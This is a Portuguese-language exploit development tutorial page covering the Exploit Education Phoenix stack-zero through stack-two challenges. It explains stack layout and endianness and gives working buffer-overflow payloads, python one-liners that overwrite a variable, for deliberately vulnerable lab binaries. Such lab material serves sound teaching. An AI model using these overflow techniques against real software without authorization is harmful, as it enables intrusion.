<!DOCTYPE HTML>
<html lang="pt-br" class="sidebar-visible no-js ayu">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>Um Livrinho Sobre Exploit Dev</title>
        
        <meta name="robots" content="noindex" />
        
        


        <!-- Custom HTML head -->
        


        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff" />

        
        <link rel="icon" href="favicon.svg">
        
        
        <link rel="shortcut icon" href="favicon.png">
        
        <link rel="stylesheet" href="css/variables.css">
        <link rel="stylesheet" href="css/general.css">
        <link rel="stylesheet" href="css/chrome.css">
        
        <link rel="stylesheet" href="css/print.css" media="print">
        

        <!-- Fonts -->
        <link rel="stylesheet" href="FontAwesome/css/font-awesome.css">
        
        <link rel="stylesheet" href="fonts/fonts.css">
        

        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="highlight.css">
        <link rel="stylesheet" href="tomorrow-night.css">
        <link rel="stylesheet" href="ayu-highlight.css">

        <!-- Custom theme stylesheets -->
        

        
    </head>
    <body>
        <!-- Provide site root to javascript -->
        <script type="text/javascript">
            var path_to_root = "";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "ayu";
        </script>

        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script type="text/javascript">
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script type="text/javascript">
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            var html = document.querySelector('html');
            html.classList.remove('no-js')
            html.classList.remove('ayu')
            html.classList.add(theme);
            html.classList.add('js');
        </script>

        <!-- Hide / unhide sidebar before it is displayed -->
        <script type="text/javascript">
            var html = document.querySelector('html');
            var sidebar = 'hidden';
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            }
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <div class="sidebar-scrollbox">
                <ol class="chapter"><li class="spacer"></li><li class="chapter-item "><a href="intro.html">Intro</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="aventura.html">Aventura</a></li></ol></li><li class="chapter-item "><li class="part-title">Stack</li><li class="spacer"></li><li class="chapter-item "><a href="stack/phoenix/setup.html">Phoenix Stack</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="stack/phoenix/StackZero.html">Stack Zero</a></li><li class="chapter-item "><a href="stack/phoenix/StackOne.html">Stack One</a></li><li class="chapter-item "><a href="stack/phoenix/StackTwo.html">Stack Two</a></li><li class="chapter-item "><a href="stack/phoenix/StackThree.html">Stack Three</a></li><li class="chapter-item "><a href="stack/phoenix/StackFour.html">Stack Four</a></li><li class="chapter-item "><a href="stack/phoenix/StackFive.html">Stack Five</a></li><li class="chapter-item "><a href="stack/phoenix/StackSix.html">Stack Six</a></li></ol></li><li class="chapter-item "><a href="stack/mitigacoes.html">Mitigações</a></li><li class="chapter-item "><div>Ret2LibC</div><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><div>Pratica</div><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><div>Protostar Stack Six</div></li></ol></li><li class="chapter-item "><div>Avançado: Multiplos ret2libc</div></li></ol></li><li class="chapter-item "><div>Estilo OSCP</div><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><div>Brainpan</div></li><li class="chapter-item "><div>Tib3rius BOF Prep</div></li></ol></li><li class="chapter-item "><div>ROP</div><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><div>Ferramentas</div></li><li class="chapter-item "><div>64vs32 Bit</div></li></ol></li><li class="chapter-item "><div>Derrotando ASLR</div></li><li class="chapter-item "><div>Derrotando Canaries</div></li><li class="chapter-item affix "><li class="part-title">Format Strings</li><li class="spacer"></li><li class="chapter-item "><div>Phoenix: Format</div></li><li class="chapter-item affix "><li class="part-title">Heap</li><li class="spacer"></li><li class="chapter-item "><div>Shellphish: How2Heap</div></li></ol>
            </div>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle"></div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                
                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky bordered">
                    <div class="left-buttons">
                        <button id="sidebar-toggle" class="icon-button" type="button" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </button>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu (default)</button></li>
                        </ul>
                        
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                        
                    </div>

                    <h1 class="menu-title">Um Livrinho Sobre Exploit Dev</h1>

                    <div class="right-buttons">
                        
                        <a href="print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>
                        
                        
                        <a href="https://github.com/0xturazzi/Um-Livrinho-Sobre-Exploit-Dev/" title="Git repository" aria-label="Git repository">
                            <i id="git-repository-button" class="fa fa-github"></i>
                        </a>
                        
                    </div>
                </div>

                
                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" name="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>
                

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script type="text/javascript">
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <p>Hey, tudo bem? :)</p>
<p>Esse é um livrinho que eu coloco coisas sobre desenvolvimento de exploit e AppSec!</p>
<p>E ele é a minha tentativa de devolver para a comunidade! Eu percebi que não existia muito conteúdo em portugues, então resolvi fazer :D... já que essa é uma area que você PRECISA de comunidade!</p>
<p>Você não pode se sustentar nos ombros de gigantes, pq não existem gigantes! \ O conhecimento vem de um milhão de mini-blogs aonde você vai aprender um milhão de mini-truques! E esse é o meu :D</p>
<p>Caso você encontre um erro tecnico ou tenha uma sugestão, por favor abre uma issue no github :)</p>
<p>Creditos pelas imagens e fontes estão nas pastas de cada tópico!</p>
<p>Na parte &quot;Aventura&quot; tem um mapa para te ajudar a navegar esse mundo! Boa sorte :D</p>
<h1><a class="header" href="#aventura" id="aventura">Aventura</a></h1>
<p>Isso nao ta pronto aaaaaaa foi mal :(</p>
<pre><code>  Stack Intro: Phoenix
        |
     ___|__________ ________  
    |              |        |
    V              V        V
  Format       O resto     Fuzzing
  Strings      da Stack
                   |
               ____|__
              |       | 
              V       V
           Windows   Heap
            |        Intro
    ________|      ____|______________
   |        |     |    |              |
   V        |     |    |              |
   Win      V     |    V              V
 File Sys  Win    |    Heap         Linux
           Stack  |    Avancado     Kernel
            |     | 
            |__ __|
               |
               V
              Win
              Heap  
</code></pre>
<p>Opa, tudo bom?</p>
<p>Tutorialzinho pq não achei nenhum em portugues D:</p>
<p>Se encontrar algum erro, abre uma issue pf :)</p>
<p><strong>Link pros desafios: <a href="https://exploit.education/phoenix/">Exploit Education Phoenix</a></strong> </p>
<p>Eu ainda não postei tudo, mas quando tiver tempo eu posto :D</p>
<p>Se quiser um bom em ingles:</p>
<p><a href="https://blog.lamarranet.com/index.php/exploit-education-phoenix-stack-zero-solution/">lamarranet</a></p>
<p><a href="https://youtu.be/Y-4WHf0of6Y">Live Overflow (Mas é sobre o antigo: Protostar)</a></p>
<p>Status</p>
<ul>
<li><input disabled="" type="checkbox" checked=""/>
Stack</li>
<li><input disabled="" type="checkbox"/>
Format</li>
<li><input disabled="" type="checkbox"/>
Heap</li>
<li><input disabled="" type="checkbox"/>
Net</li>
<li><input disabled="" type="checkbox"/>
Final</li>
</ul>
<h1><a class="header" href="#-prerequisitos" id="-prerequisitos">🖥️ Prerequisitos:</a></h1>
<ul>
<li>Saber alguma linguagem de programação e conceitos relacionados</li>
</ul>
<h1><a class="header" href="#-opcional-mas-util-saber" id="-opcional-mas-util-saber">🐧 Opcional mas util saber</a></h1>
<ul>
<li>💾 Um pouco de C / C++ / Rust / Linguagem de nível baixo</li>
<li>🐍 Alguma linguagem de scripting: Python, Ruby, .....</li>
<li>🐧 Saber o basico de Linux</li>
</ul>
<h1><a class="header" href="#-setup" id="-setup">🤖 Setup:</a></h1>
<ul>
<li>Baixar kali linux usando VM-Ware ou Virtual Box</li>
<li>Baixar Qemu na VM: <code>sudo apt-get install qemu</code></li>
<li>Baixar a imagem QCOW2 (eu usei AMD64): <a href="https://exploit.education/downloads/">Downloads Exploit Education</a></li>
<li>Na maquina kali executar:</li>
</ul>
<pre><code class="language-bash">$ cd ~/Downloads/exploit-education-phoenix-amd64
$ chmod +x boot-exploit-education-phoenix-amd64.sh
$ ./boot-exploit-education-phoenix-amd64.sh
</code></pre>
<ul>
<li><strong>NÂO USAR O CONSOLE BUGADO QUE APARECE !!!</strong> Miniza e esquece que ele existe!</li>
<li>Usa: ssh -p 2222 user@localhost # Os usuarios/senha são: user/user e root/root</li>
<li>Os arquivos tão em: cd /opt/phoenix/amd64</li>
</ul>
<p>Boa Sorte! :D</p>
<h1><a class="header" href="#-descrição" id="-descrição">📝 Descrição</a></h1>
<p>Esse nivel demonstra que memoria pode ser acessada fora da sua região 
inicialmente alocada, como as variaveis são alocadas na stack, e que altera-las pode mudar a execução do programa.</p>
<p>Objetivo: Alterar a variavel &quot;changeme&quot;</p>
<h1><a class="header" href="#-dica" id="-dica">💡 Dica</a></h1>
<pre><code class="language-bash">$ python3 -c &quot;print('A' * 10)&quot;
AAAAAAAAAA

$ python3 -c &quot;print('A' * 10)&quot; | ./stack-zero 
</code></pre>
<h1><a class="header" href="#conhecimento-preliminar" id="conhecimento-preliminar">Conhecimento Preliminar</a></h1>
<h2><a class="header" href="#buffer" id="buffer">Buffer</a></h2>
<p>Buffers são similares a arrays em outras linguagens de programação,
mas possuem tamanho fixo!</p>
<p>Eles são definidos usando: <code>tipo nome[tamanho]</code> </p>
<p>O <code>tipo</code>, é do que esta sendo armazenado dentro, por exemplo:</p>
<pre><code class="language-C">char buf[64]; // Armazena 64 caracteres
int buf[32];  // Armazena 32 ints
</code></pre>
<p>Esses buffers por possuirem tamanho fixo, são armazenados na stack!</p>
<h2><a class="header" href="#stack" id="stack">Stack</a></h2>
<p>A stack é uma porção da memoria que armazena como se fosse uma pilha de pratos:</p>
<pre><code>Quando você quer colocar um novo, você coloca no topo da pilha (push)
Qando você quer pegar um da pilha, você pega o do topo (pop)

O ultimo a entrar, é o primeiro a sair...
o nome desse comportamento é LIFO (Last in First Out)
</code></pre>
<p><img src="stack/phoenix/./img/push-pop.png" alt="Imagem da wikipedia mostrando PUSH e POP" /></p>
<h3><a class="header" href="#a-stack-cresce-para-valores-menores" id="a-stack-cresce-para-valores-menores">A stack cresce para valores menores</a></h3>
<pre><code>Imagina que ela é um poço que começa na profundidade 15

Quando você coloca um objeto de tamanho 2 no poço:
ele vai estar apoiado na profundidade 15, e vai até a profundidade 13

Em seguida, você coloca algo de tamanho 3:
vai estar apoiado na profundidade 13, e vai até a profundidade 10
</code></pre>
<p>Conforme você vai <strong>adicionando</strong> itens, o endereço que eles estão vai <strong>diminuindo</strong> em valor.
É meio confuso, mas com o tempo você pega o jeito.</p>
<p>Pra complicar um pouco mais, esses endereços tão em hexadecimal (0x0 ate 0xF, o &quot;0x&quot; é pra representar que o valor tá em hex).</p>
<h3><a class="header" href="#hex" id="hex">Hex</a></h3>
<p>Se vc não souber hex: <a href="https://pt.wikipedia.org/wiki/Sistema_de_numera%C3%A7%C3%A3o_hexadecimal">Wikipedia Sistema de numeração hexadecimal</a>
. Mas resumindo, em hex você conta:</p>
<pre><code>Hex: 0,1,2,...,8,9,A ,B ,C ,D ,E ,F ,10,11,12,...,19,1A,1B,1C,...,FF
Dec: 0,1,2,...,8,9,10,11,12,13,14,15,16,17,18,...,25,26,27,28,...,127
</code></pre>
<p>Então a base da stack é 0xFFFFFFFF e o topo 0X00000000 !</p>
<h3><a class="header" href="#melhorando-o-exemplo-do-poço" id="melhorando-o-exemplo-do-poço">Melhorando o exemplo do poço</a></h3>
<pre><code>0x0- 	     Topo da stack/Topo do poço
0xA ate 0x1- espaço vazio
0xD-         Segundo item
0xF-         Base da stack/Fundo do poço, primeiro item
</code></pre>
<h1><a class="header" href="#-explicação" id="-explicação">🎉 Explicação</a></h1>
<p>A função main() pode estar sendo divida em 3 Partes:</p>
<ol>
<li>🥞 Alocando as variaveis na stack (buffer[64], changeme)</li>
<li>💥 Alterar buffer[64] usando gets()</li>
<li>✅ Checando se changeme foi alterada</li>
</ol>
<pre><code class="language-C">int main(int argc, char **argv) {
			// Definir variaveis locais
  struct {
    char buffer[64];
    volatile int changeme;
  } locals;

  printf(&quot;%s\n&quot;, BANNER); // Printar o banner (todo nivel faz isso)

  locals.changeme = 0;
  gets(locals.buffer);   // Alterar o buffer

  if (locals.changeme != 0) { 	// Checar se changeme foi alterada
    puts(&quot;Well done, the 'changeme' variable has been changed!&quot;);
  } else {
    puts(&quot;Uh oh, 'changeme' has not yet been changed&quot;);
  }

  exit(0);
}
</code></pre>
<p>Ue, <code>changeme</code> nunca foi alterada... Ela não deveria estar mudando!</p>
<p>Calma que você ja vai enteder :)</p>
<h2><a class="header" href="#-1--alocando-as-variaveis-na-stack-buffer64-changeme" id="-1--alocando-as-variaveis-na-stack-buffer64-changeme">🥞 1- Alocando as variaveis na stack (buffer[64], changeme)</a></h2>
<p>A variavel <code>buffer[64]</code> tem  tamanho de 64 bytes (64 letras, assumindo ASCII, um byte por letra).</p>
<p>A variavel <code>changeme</code> esta marcada como <code>volátil</code> para previnir que o compilador
destrua ela (pq originalmente não seria
alterada, então seria destruida para otimizar o código... 
Mas nós vamos alterar ela por metodos... ~risada malefica~ ... não convencionais hehehe).</p>
<p>Nossas duas variaveis (buffer[64] e changeme) são empurradas na stack.</p>
<pre><code>buffer[64] (preenchido com zeros (vazio))
changeme   (com o valor: 0x00)
ret        - Base dessa stack
</code></pre>
<h2><a class="header" href="#-2--alterar-buffer64-usando-gets" id="-2--alterar-buffer64-usando-gets">💥 2- Alterar buffer[64] usando gets</a></h2>
<p>A função <code>gets()</code> abre um input no terminal, e escreve o que recebeu no <code>buffer</code>.</p>
<p>O problema é que ela <strong>não</strong> checa se o valor recebido é maior que o <code>buffer</code>, permitindo que 
você <strong>escreva fora do buffer!!</strong> D:</p>
<p>Ela vai começar a escrever no topo do buffer (menor endereço)
e vai descendo até a base da stack.</p>
<pre><code>**Stack**
buffer
       [
A           | Gets escreve nesse sentido
A           |
A           \/
...
A
      ]
changeme (com valor 0x00)
ret       - Base dessa stack
</code></pre>
<p>Então, caso colocassemos 100 &quot;A&quot;s no buffer de tamanho 64, as variaveis nos proximos 36 endereços seriam alteradas.</p>
<p>Essas variaveis ficariam com o valor &quot;41&quot;, mas pq 41?</p>
<p>O valor ASCII do &quot;A&quot; é 0x41, você pode checar o de todas letras usando:</p>
<blockquote>
<p>$ man ascii</p>
</blockquote>
<p>Ui, o usuario pode escrever fora memoria dele? perigoso ne! D:</p>
<p>É por isso que essa função está marcada como <em>Deprecated</em> (fora de uso).</p>
<p>No nosso caso, o buffer tem o tamanho de <strong>64</strong> bytes, se colocarmos <strong>65</strong> &quot;A&quot;s (65 bytes), o valor vai vazar desse buffer.
Isso quer dizer que antes a variavel <code>changeme</code> tinha o valor <strong>0x00</strong> e agora tem o valor <strong>0x41</strong> !</p>
<pre><code>**Stack**
buffer
      [
41           | Gets escreve nesse sentido
41           |
41           \/
...
41
      ]
changeme (com o valor: 41)
ret       - Base dessa stack
</code></pre>
<h2><a class="header" href="#-3--o-programa-checa-se-changeme-foi-alterada" id="-3--o-programa-checa-se-changeme-foi-alterada">✅ 3- O programa checa se changeme foi alterada</a></h2>
<p>Se foi alterada, quer dizer que a gente <em>overflow-ou</em> (escreveu fora) do buffer, é vitoria!!! :D</p>
<p>Ta, mas como a gente faz isso na prática?</p>
<p><code>python3 -c &quot;print(&quot;A&quot;*65)&quot;</code> printa 65 &quot;A&quot;s para o terminal</p>
<p>Então se a gente encaminhar esses &quot;A&quot;s pro programa....</p>
<pre><code>Se você quer tentar resolver sozinhe, agora é a sua hora!

.
.
.
.
</code></pre>
<h3><a class="header" href="#-64-as-changeme-não-alterado" id="-64-as-changeme-não-alterado">❌ 64 As, changeme não alterado</a></h3>
<pre><code class="language-bash">$ python3 -c &quot;print('A' * 64)&quot; | ./stack-zero 
Banner
Uh oh, 'changeme' has not yet been changed.
Would you like to try again?
</code></pre>
<h3><a class="header" href="#-65-as-changeme-alterado" id="-65-as-changeme-alterado">✅ 65 As, changeme alterado</a></h3>
<pre><code class="language-bash">$ python3 -c &quot;print('A' * 65)&quot; | ./stack-zero 
Banner
Well done, the 'changeme' variable has been changed!
</code></pre>
<h3><a class="header" href="#🅱-64-as-e-um-b-0x42-aaaaaaaaaaaab" id="🅱-64-as-e-um-b-0x42-aaaaaaaaaaaab">🅱️ 64 As e um B (0x42): AAAAAAAAA.....AAAB</a></h3>
<p>Para demonstrar melhor esse comportamento do buffer 
ser escrito em um sentido específico (pq vai ser muito importante saber disso),
vou dar outro exemplo:
<code>python3 -c &quot;print('A' * 64 + 'B')&quot;</code> </p>
<pre><code class="language-md">buffer [
41           | Gets escreve nesse sentido
41           |
41           \/
...
41
       ]
changeme (com o valor: 42)   &lt;- B = 42!!!!
ret       - Base dessa stack
</code></pre>
<p>Os <code>A</code>s preenchem certinho a stack, e a gente pode colocar o valor que quiser na variavel!! Uhhuuu :D</p>
<p>Esses As só pra encher a stack são chamados de <code>padding</code> (traduz pra preenchimento).</p>
<hr />
<p>Fim! :D</p>
<p>Ouch... isso foi um bocado de explicação, mas relaxa que daqui pra frente fica mais dificil hehehe :D</p>
<p>Se você chegou até aqui, você ta de parabens !!!</p>
<p>Pra lembrar bem, desenha uma stack no papel, da um push nas variaveis e no buffer, mostra o sentido que o 
buffer escreve, e ele vazando e mudando o valor das outras variaveis...</p>
<h1><a class="header" href="#-solução" id="-solução">👾 Solução</a></h1>
<pre><code class="language-bash">$ python3 -c &quot;print('A' * 65)&quot; | ./stack-zero
Welcome to phoenix/stack-zero, brought to you 
by https://exploit.education
Well done, the 'changeme' variable has been changed!
</code></pre>
<h1><a class="header" href="#-objetivo" id="-objetivo">🎯 Objetivo</a></h1>
<p>Agora o objetivo não é só alterar <code>changeme</code>, é alterar para um valor especifico!</p>
<p>Lembra aquilo de controlar o valor depois do preenchimento (<code>padding</code>) ?</p>
<p>Pois é, ele vai ser super util agora!</p>
<h1><a class="header" href="#-dicas" id="-dicas">💡 Dicas</a></h1>
<p>Ver a representação hex de cada letra:</p>
<blockquote>
<p>$ man ascii</p>
</blockquote>
<p>Dar um Google sobre Endianess.</p>
<h1><a class="header" href="#-explicação-1" id="-explicação-1">💫 Explicação</a></h1>
<p>Se lembra de que no tutorial passado a gente trocou <code>changeme</code> pra <strong>41</strong> e <strong>42</strong>?</p>
<p>O que ta acontecendo por tras das cenas é que as letras estão virando a sua representação hex.</p>
<p>Então <code>print(&quot;A&quot;*5)</code> é equivalente à <code>print(b&quot;\x41&quot;*5)</code></p>
<blockquote>
<p>Presta atenção no b&quot;&quot; : esse b indica que são Bytes! :D</p>
</blockquote>
<p>As vezes o python3 vai reclamar de você usar valores arbitrários pra esses bytes,
então você pode usar o python2 (o print não tem parenteses, mas o resto é igual):</p>
<blockquote>
<p>$ python -c &quot;print 'blablabla'&quot;</p>
</blockquote>
<p>Nesse caso, changeme ta sendo comparada com <strong>0x496c5962</strong></p>
<pre><code class="language-C">  if (locals.changeme == 0x496c5962) {
    puts(&quot;Well done, you have successfully set changeme 
				to the correct value&quot;);
</code></pre>
<p>O buffer tem tamanho 64 de novo, então podemos usar 64 caracteres para preenche-lo, igual na anterior! uhuuuu :D</p>
<h2><a class="header" href="#input" id="input">Input</a></h2>
<p>Nesse caso, o programa não ta usando o gets pra abrir um input.</p>
<p>Ele ta usando o <code>argv</code> (o que vem depois do nome do programa quando
você executa no terminal)</p>
<blockquote>
<p>./stack-one teste batata</p>
</blockquote>
<pre><code>agrv[0] = stack-one (o nome do programa)
argv[1] = teste
argv[2] = batata
... e assim por diante
</code></pre>
<blockquote>
<p>argc é a contagem: quantas coisas tem no argv! E aqui tá checando se é menor que 2!</p>
</blockquote>
<p>então no nosso caso, para mandar o input do python para o agrv vai funcionar assim:</p>
<blockquote>
<p>$ ./stack-one $(python -c &quot;print b'A' * 64&quot;)
o <code>$()</code> executa o comando dentro dos parenteses e usa o valor retornado como input do outro!</p>
</blockquote>
<p>então <code>$(python....)</code> vai executar, e em seguida:</p>
<blockquote>
<p>./stack-one AAAAAAAAAAAAAA...</p>
</blockquote>
<h2><a class="header" href="#endian" id="endian">Endian</a></h2>
<p>O valor de changeme tem tamanho 4 bytes, pq ele é um integer (integers são 32 ou 64 bits, então 4 ou 8 bytes). Isso quer dizer que a gente pode colocar 4 letras :D</p>
<pre><code>./stack-one $(python -c &quot;print b'A' * 64 + 'BCDE'&quot;)
Welcome to phoenix/stack-one, brought to you by exploit.education
Getting closer! changeme is currently 0x45444342, we want 0x496c5962
</code></pre>
<p>O programa nos diz o valor de <code>changeme</code>, que nos alteramos por ter <strong>overflow-ado</strong> o buffer</p>
<p>Ue, que esquisito, vc reparou algo de estranho?</p>
<p>A gente mandou <code>BCDE (42 43 44 45)</code> e ele colocou <code>EDCB (45 44 43 42)</code>, por que isso?</p>
<p>Os computadores armazenam integers usando um sistema Little Endian (LE) ou Big Endian (BE), esses sistemas decidem como os numeros são representados.</p>
<blockquote>
<p>Esses sistemas se referem a magnitude dos digitos, Centena, Dezena, Unidade,...</p>
</blockquote>
<blockquote>
<p>Em um sistema BE, os numeros são representados em ordem descrescente CDU.</p>
</blockquote>
<blockquote>
<p>Em um sistema LE, os numeros são representados em ordem crescente UDC.</p>
</blockquote>
<pre><code>Por exemplo, o numero cento e vinte três:
BE: 123        
LE: 321
</code></pre>
<p>No dia a dia, nos humanos usamos o sistema BE, mas os computadores preferem LE, então eles invertem a ordem dos 4 bytes nos numeros inteiros!</p>
<p>Então pra gente conseguir que changeme seja <code>BCDE</code>, a gente precisa passar <code>EDCB</code> pro computador! :D</p>
<pre><code>$ ./stack-one $(python -c &quot;print b'A' * 64 + 'EDCB'&quot;)
Welcome to phoenix/stack-one, brought to you by exploit.education
Getting closer! changeme is currently 0x42434445, we want 0x496c5962
</code></pre>
<p>Isso quer dizer que pra gente definir <code>changeme = 49 6c 59 62</code>, e completar
o desafio, a gente precisa inverter a ordem dos bytes (<code>62 59 6c 49</code>)! :D</p>
<p>Mas eu não sei que letras são equivalentes a esses numeros... e nem todo numero tem uma letra!</p>
<h3><a class="header" href="#-dica-usando-valores-hex-diretamente" id="-dica-usando-valores-hex-diretamente">🌙 Dica: Usando valores hex diretamente</a></h3>
<p>Lembra que eu falei que letras são valores hex? A gente tambem pode usar os valores hex diretamente usando \x  :D</p>
<blockquote>
<p>Então usar b&quot;\x41&quot; é igual a b&quot;A&quot;!</p>
</blockquote>
<pre><code>$ ./stack-one $(python -c &quot;print b'A' * 64 + b'\x62\x59\x6c\x49'&quot;)
Welcome to phoenix/stack-one, brought to you by exploit.education
Well done, you have successfully set changeme to the correct value
</code></pre>
<p>Yay vitoria! </p>
<p>Caso você queira usar as letras, voce pode tambem!</p>
<p>Então <code>b'\x62\x59\x6c\x49'</code> é equivalente a <code>b'bYlI'</code></p>
<pre><code>$ ./stack-one $(python -c &quot;print b'A' * 64 + b'bYlI'&quot;)
Welcome to phoenix/stack-one, brought to you by exploit.education
Well done, you have successfully set changeme to the correct value
</code></pre>
<p>Mas e nos casos que o byte não tem um correspondente válido? Vc usa <code>&quot;\x&quot;</code> :D</p>
<p>Na verdade, é mais prático usar <code>\x</code> 99% das vezes, então vale a pena criar o habito!</p>
<h1><a class="header" href="#-solução-1" id="-solução-1">🔥 Solução</a></h1>
<blockquote>
<p>./stack-one $(python -c &quot;print b'A' * 64 + b'bYlI'&quot;)</p>
</blockquote>
<h1><a class="header" href="#-objetivo-1" id="-objetivo-1">🎯 Objetivo</a></h1>
<p>Similar à anterior, a gente precisa mudar o valor da variavel changeme,
mas dessa vez ao inves de usar o input ou agrv, vamos usar env!</p>
<h1><a class="header" href="#-explicação-2" id="-explicação-2">💫 Explicação</a></h1>
<p>Nesse desafio, o programa usa getenv(&quot;ExploitEducation&quot;) para ler uma
enviroment variable. </p>
<h2><a class="header" href="#-environment-variable-variável-do-ambiente" id="-environment-variable-variável-do-ambiente">🌳 Environment Variable (Variável do ambiente)</a></h2>
<p>Essas variaveis são acessiveis para todos os programas
executando naquela seção. E normalmente contem preferencias como cores, o tipo de terminal, etcetc....</p>
<p>Você pode checa-las usando</p>
<blockquote>
<p>$ env</p>
</blockquote>
<p>Você pode definir uma até o resto da seção</p>
<blockquote>
<p>$ export Nome=Valor</p>
</blockquote>
<p>Você pode definir uma somente para execução daquele programa</p>
<blockquote>
<p>$ Nome=Valor ./stack-two</p>
</blockquote>
<p>Para nós, não faz tanta diferença se o input é pelas <code>envs</code> ou por outro metodo.</p>
<p>O unico problema é que não podemos usar o Null Byte (0x00), pois ele é usado para indicar o final de uma string ASCII, portanto terminando nossa variavel precocemente.</p>
<h2><a class="header" href="#overflow" id="overflow">Overflow</a></h2>
<p>Em seguida, o valor é copiado para um <code>buffer[64]</code> usando: <code>strcpy(buffer, ptr)</code>. Com <code>ptr</code> sendo o valor da <code>env</code> 'ExploitEducation'.</p>
<p>A função <code>strcpy</code>, assim como <code>gets</code>, não checa se o valor é maior que o buffer, tornando o programa vulnerável... :(</p>
<p>Por ultimo, o programa checa se <code>changeme == 0x0d0a090a</code></p>
<blockquote>
<p>Levando em consideração que o sistema é LE: 0a 09 0a 0d</p>
</blockquote>
<p>Mas pera ai, checando o manual ASCII, esses caracteres são usados para encerrar linha, não é uma letra do teclado! D:</p>
<p>Pois é, então vamos precisar usar os bytes diretamente.</p>
<pre><code>Se você quer tentar resolver sozinhe, agora é a sua hora!

.
.
.
.
.
.
.
.
.
.
.
.
.
</code></pre>
<p>Eu precisei colocar em caixinhas diferentes para caber na tela :(</p>
<blockquote>
<p>$ ExploitEducation=$(python -c &quot;print b'A'*64 + b'\x0a\x09\x0a\x0d'&quot;) ./stack-two </p>
</blockquote>
<pre><code>Welcome to phoenix/stack-two, brought to you by exploit.education
Well done, you have successfully set changeme to the correct value
</code></pre>
<p>Uhuuu, esse foi mais fácil :D</p>
<h1><a class="header" href="#-solução-2" id="-solução-2">🔥 Solução</a></h1>
<blockquote>
<p>$ ExploitEducation=$(python -c &quot;print b'A'*64 + b'\x0a\x09\x0a\x0d'&quot;) ./stack-two</p>
</blockquote>
<h1><a class="header" href="#-objetivo-2" id="-objetivo-2">🎯 Objetivo</a></h1>
<p>Usar um pointer para retornar para uma função pre existente</p>
<h1><a class="header" href="#-dica-1" id="-dica-1">💡 Dica</a></h1>
<p>OBS: em Ingles! // <a href="https://en.wikipedia.org/wiki/Pointer_(computer_programming)">Wikipedia Pointer</a></p>
<h1><a class="header" href="#-explicação-3" id="-explicação-3">💫 Explicação</a></h1>
<ul>
<li>O que raios são pointers</li>
<li>Function pointers</li>
<li>Exploit</li>
</ul>
<h3><a class="header" href="#-o-que-raios-são-pointers" id="-o-que-raios-são-pointers">↗️↘️ O que raios são pointers</a></h3>
<blockquote>
<p>Pointers são uma estrutura que, ao invés de armazenar dados, armazena o endereço de outra estrutura.
Lembra do exemplo do poço? Que cada item tinha seu endereço na stack! Então, um pointer armazena esse endereço! :D</p>
</blockquote>
<p>O pointer pode ser visto como uma placa na estrada, indicando que X cidade está em Y direção.</p>
<p>Colunas: Nome da Variavel | Endereço | conteúdo</p>
<p><img src="stack/phoenix/./img/pointer.png" alt="Imagem da wikipedia mostrando um pointer" /></p>
